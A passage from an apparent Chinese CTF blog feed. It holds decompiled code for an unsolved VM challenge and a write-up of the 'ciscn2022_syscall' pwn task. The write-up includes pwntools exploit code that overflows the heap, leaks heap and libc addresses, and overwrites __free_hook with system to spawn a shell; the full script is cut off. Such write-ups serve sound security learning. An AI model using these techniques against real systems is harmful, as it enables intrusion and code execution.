class=\"keyword\">case</span> <span class=\"string\">&#x27;3&#x27;</span>:</span><br><span class=\"line\">        v23 = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * v23 + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        i = v23 + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * i + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        v7 = (_DWORD *)dest[<span class=\"number\">3</span>];</span><br><span class=\"line\">        *v7 = sub_4013AC(dest);</span><br><span class=\"line\">        v8 = (_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        *v8 = sub_4013AC(dest);</span><br><span class=\"line\">        *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>) = *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>) * *(_DWORD *)dest[<span class=\"number\">3</span>];</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>));</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;4&#x27;</span>:</span><br><span class=\"line\">        v24 = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * v24 + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        i = v24 + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * i + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        v9 = (_DWORD *)dest[<span class=\"number\">3</span>];</span><br><span class=\"line\">        *v9 = sub_4013AC(dest);</span><br><span class=\"line\">        v10 = (_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        *v10 = sub_4013AC(dest);</span><br><span class=\"line\">        *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>) = *(_DWORD *)dest[<span class=\"number\">3</span>] / *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>));</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;5&#x27;</span>:</span><br><span class=\"line\">        v25 = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * v25 + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        i = v25 + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * i + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        v11 = (_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        *v11 = sub_4013AC(dest);</span><br><span class=\"line\">        v12 = (_DWORD *)dest[<span class=\"number\">3</span>];</span><br><span class=\"line\">        *v12 = sub_4013AC(dest);</span><br><span class=\"line\">        *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>) = *(_DWORD *)dest[<span class=\"number\">3</span>] &lt;&lt; *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>));</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;6&#x27;</span>:</span><br><span class=\"line\">        v26 = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * v26 + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        i = v26 + <span class=\"number\">1</span>;</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * i + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        v13 = (_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        *v13 = sub_4013AC(dest);</span><br><span class=\"line\">        v14 = (_DWORD *)dest[<span class=\"number\">3</span>];</span><br><span class=\"line\">        *v14 = sub_4013AC(dest);</span><br><span class=\"line\">        *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>) = *(<span class=\"type\">int</span> *)dest[<span class=\"number\">3</span>] &gt;&gt; *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4</span>);</span><br><span class=\"line\">        sub_401334(dest, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">8</span>));</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;7&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( *((<span class=\"type\">int</span> *)dest + <span class=\"number\">2</span>) &gt; <span class=\"number\">65</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          *dest = ((__int64 (__fastcall *)(__int64))dest[<span class=\"number\">4</span>])(<span class=\"number\">256LL</span>);</span><br><span class=\"line\">          *((_DWORD *)dest + <span class=\"number\">2</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        v15 = (_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4LL</span> * *(<span class=\"type\">int</span> *)(<span class=\"number\">4LL</span> * ++i + dest[<span class=\"number\">2</span>]));</span><br><span class=\"line\">        v16 = *dest;</span><br><span class=\"line\">        *(_DWORD *)(<span class=\"number\">4LL</span> * (<span class=\"type\">int</span>)++*((_DWORD *)dest + <span class=\"number\">2</span>) + v16) = *v15;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;8&#x27;</span>:</span><br><span class=\"line\">        v28 = *(_DWORD *)(<span class=\"number\">4LL</span> * ++i + dest[<span class=\"number\">2</span>]);</span><br><span class=\"line\">        v17 = *dest;</span><br><span class=\"line\">        v18 = *((_DWORD *)dest + <span class=\"number\">2</span>);</span><br><span class=\"line\">        *((_DWORD *)dest + <span class=\"number\">2</span>) = v18 - <span class=\"number\">1</span>;</span><br><span class=\"line\">        *(_DWORD *)(dest[<span class=\"number\">3</span>] + <span class=\"number\">4LL</span> * v28) = *(_DWORD *)(v17 + <span class=\"number\">4LL</span> * v18);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;9&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( *((_DWORD *)dest + <span class=\"number\">10</span>) )</span><br><span class=\"line\">          *(_DWORD *)(*dest + <span class=\"number\">4LL</span> * *((<span class=\"type\">int</span> *)dest + <span class=\"number\">2</span>)) += *(_DWORD *)(<span class=\"number\">4LL</span> * ++i + dest[<span class=\"number\">2</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  sub_4012FC(src);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>逆向的工作量比较大。但是大概理了下里面数据的存储格式，以 4 字节作为基本的处理单元，每次处理 3 个或者两个，第一个用作 case 的判断。</p>\n<ol>\n<li>加法</li>\n<li>减法</li>\n<li>乘法</li>\n<li>除法</li>\n<li>左移位</li>\n<li>右移位</li>\n<li>push    RI  count 大于 65, 重新申请一个 0x100 的 chunk 用作函数的 stack。储存算术的数据，但是，不会检查 idx，可能会导致越界。</li>\n<li>pop RI</li>\n<li>push imm32</li>\n</ol>\n<p>以上均为接受两个 int 类型，我们的基本操作快的数量不超过 64，为什么这这样说，加载操作数的时候，加两次，将操作数拿出来，减去两次，储存计算结果加一次。</p>\n<p>程序实现基本的算术运算以及逻辑运算。并且采用了 stack 进行存储，但是程序没有输出啊。</p>\n<h2 id=\"尚未解决\"><a class=\"markdownIt-Anchor\" href=\"#尚未解决\">#</a> 尚未解决</h2>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/06/18/ciscn2022-syscall/",
            "url": "http://example.com/2022/06/18/ciscn2022-syscall/",
            "title": "ciscn2022_syscall",
            "date_published": "2022-06-18T13:15:41.000Z",
            "content_html": "<h1 id=\"ciscn2022_syscall\"><a class=\"markdownIt-Anchor\" href=\"#ciscn2022_syscall\">#</a> ciscn2022_syscall</h1>\n<p>程序的漏洞点在于 free 后不会清空 size 数组对应的数据，而且在同一个该位置再次申请一个 chunk 的时候，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( choice == <span class=\"number\">17</span> )                    <span class=\"comment\">// malloc</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      idx = (syscall)(<span class=\"number\">38929LL</span>, sub_E1B, <span class=\"number\">0LL</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( idx &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( idx &gt; <span class=\"number\">4</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (syscall)(<span class=\"number\">38929LL</span>, getheap_ptr, idx, <span class=\"number\">0LL</span>) )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">      v2 = (syscall)(<span class=\"number\">38929LL</span>, strings, <span class=\"number\">5LL</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">      (syscall)(<span class=\"number\">38929LL</span>, printf_, v2, <span class=\"number\">5LL</span>);</span><br><span class=\"line\">      szie = (syscall)(<span class=\"number\">38929LL</span>, read_, <span class=\"number\">0LL</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( szie &lt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( szie &gt; <span class=\"number\">40</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">      v3 = (syscall)(<span class=\"number\">38929LL</span>, malloc_, szie, <span class=\"number\">0LL</span>);<span class=\"comment\">// malloc</span></span><br><span class=\"line\">      (syscall)(<span class=\"number\">38929LL</span>, saveheap, idx, v3);</span><br><span class=\"line\">      v4 = (syscall)(<span class=\"number\">38929LL</span>, strings, <span class=\"number\">9LL</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">      (syscall)(<span class=\"number\">38929LL</span>, printf_, v4, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">      v5 = szie;</span><br><span class=\"line\">      v6 = (syscall)(<span class=\"number\">38929LL</span>, getheap_ptr, idx, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">      (syscall)(<span class=\"number\">0x1231</span>LL, v6, v5, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">      v7 = (syscall)(<span class=\"number\">38929LL</span>, getheap_ptr, idx, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (syscall)(<span class=\"number\">38929LL</span>, sub_E62, v7, <span class=\"number\">0LL</span>) )<span class=\"comment\">// ke I\t\t\t\t\t//这里会检查我们输入的数据是否为DEADBEEF</span></span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_32;\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"comment\">//如果是就会跳转，而下面则是记录这次我们申请的size</span></span><br><span class=\"line\">      (syscall)(<span class=\"number\">38929LL</span>, read_context, idx, szie);</span><br><span class=\"line\">      v8 = (syscall)(<span class=\"number\">38929LL</span>, getheap_ptr, idx, <span class=\"number\">0LL</span>) &amp; <span class=\"number\">0xFFF</span>;</span><br><span class=\"line\">      v9 = (syscall)(<span class=\"number\">38929LL</span>, strings, <span class=\"number\">7LL</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">      (syscall)(<span class=\"number\">38929LL</span>, printf_, v9, v8);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">      </span><br><span class=\"line\">      </span><br></pre></td></tr></table></figure>\n<p>// 如果是就会跳转，而下面则是记录这次我们申请的 size，这里一旦跳转，size 数组不会被更改，可能存在溢出。如上一次我们在这个位置放的堆块，申请的 size 是 0x28, 下一次我们申请的是 0x10，数据为 DEADBEEF，这里的 size 依旧是 0x28，造成溢出。</p>\n<p>思路</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x28</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x28</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x28</span>) <span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x28</span>) <span class=\"comment\">#3</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br></pre></td></tr></table></figure>\n<p>申请出来四个 chunk，size 数组都是为 0x28</p>\n<p>然后申请 4 个 0x10，数据为 DEADBEEF</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">new_add</span>():</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;17&#x27;</span>)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&#x27;size: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x10</span>))</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">    r.sendafter(<span class=\"string\">&#x27;content: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"string\">&#x27;DEADBEEF&#x27;</span>)) </span><br><span class=\"line\"></span><br><span class=\"line\">new_add()</span><br><span class=\"line\">new_add()</span><br><span class=\"line\">new_add()</span><br><span class=\"line\">new_add()</span><br></pre></td></tr></table></figure>\n<p>这里就会造成溢出。先后释放 2，1，两个 chunk 进入 tcache，并且 1 对应的 chunk 的 fd 指针指向 2，chunk0 只有 0x20。我们输出 chunk0，一共输出 0x28 字节，将 chunk1 的 fd 指针泄露出来，就完成了堆地址的泄露。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;content: &quot;</span>)</span><br><span class=\"line\">r.recv(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">heap_addr = u64(r.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n<p>接下来，我们修改 chunk3 的头部，将其 size 从 0x21 改为 largebin 的大小范围，free (3) 令其进入 unsortedbins，我们在申请时，不要覆盖掉原本的 bk 指针就可以泄露出 libc 的地址。</p>\n<p>这里 free (3) 要绕过检查，所以我们将伪造他的下一个 chunk 的 size。先后释放 2,1, 使 chunk1 的 fd 指向 chunk2，利用 chunk0 的溢出，修改 chnnk1 的 fd，使其指向我们的目标地址。将伪造的 chunk3 的下一个堆的头写为合法的大小。同时这个伪造的 chunk 的下一堆的 size 也要合法，但是我们只能写 0x28 字节，所以我们将第一个伪造成 0x11，</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">new_add() <span class=\"comment\">#1 0x370</span></span><br><span class=\"line\"></span><br><span class=\"line\">new_add() <span class=\"comment\">#2 0x390</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x501</span>))</span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\">aimed_addr = heap_addr+<span class=\"number\">0x10</span>+<span class=\"number\">0x500</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(<span class=\"number\">0x21</span>)*<span class=\"number\">4</span>+p64(aimed_addr))</span><br><span class=\"line\">new_add()       <span class=\"comment\">#1  0x370</span></span><br><span class=\"line\"></span><br><span class=\"line\">new_add()    <span class=\"comment\">#20x8a0</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x11</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x11</span>))</span><br></pre></td></tr></table></figure>\n<p>现在 chunk3 就可以正常 free，绕过检查。我们从 unsortedbins 上申请一个 chunk，完成 libc 的泄露</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\">new_add()</span><br><span class=\"line\">show(<span class=\"number\">3</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;content: &quot;</span>)</span><br><span class=\"line\">r.recv(<span class=\"number\">8</span>)</span><br><span class=\"line\">libcbase = u64(r.recv(<span class=\"number\">8</span>))-<span class=\"number\">0x3ec0d0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libcbase))</span><br></pre></td></tr></table></figure>\n<p>后面就是我们修改__free_hook 数据为 system 地址，触发 getshell</p>\n<p>同样的手法。chunk0 修改 chunk1 的 fd，只不过这次是先后释放 3，1，chunk1 原本指向 chunk3</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">system = libcbase+ libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">free_hook = libcbase + libc.sym[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x21</span>)+p64(free_hook))</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,p64(system))</span><br><span class=\"line\">pause()</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n<p>getflag</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CDesktop%5Cciscn%5C%E5%8D%8A%E5%86%B3%E8%B5%9B%5C%E8%B5%9B%E9%A2%98%5C%E4%BA%8C%E8%BF%9B%E5%88%B6%5C1%5C1655218920143203%5CQQ%E5%9B%BE%E7%89%8720220618214051.png\" alt=\"QQ图片20220618214051\"></p>\n<p>完整 exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dbg</span>():</span><br><span class=\"line\">    gdb.attach(p)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#r = process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;172.16.9.42&#x27;</span>,<span class=\"number\">8083</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">sz,content</span>):</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;17&#x27;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&#x27;size: &#x27;</span>,<span class=\"built_in\">str</span>(sz))</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">    r.sendafter(<span class=\"string\">&#x27;content: &#x27;</span>,content)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;addr: &#x27;</span>)</span><br><span class=\"line\">    offset = <span class=\"built_in\">int</span>(r.recv(<span class=\"number\">5</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> offset</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">new_add</span>():</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;17&#x27;</span>)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&#x27;size: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x10</span>))</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">    r.sendafter(<span class=\"string\">&#x27;content: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"string\">&#x27;DEADBEEF&#x27;</span>)) </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;68&#x27;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&#x27;idx: &#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    r.sendafter(<span class=\"string\">&#x27;content: &#x27;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span 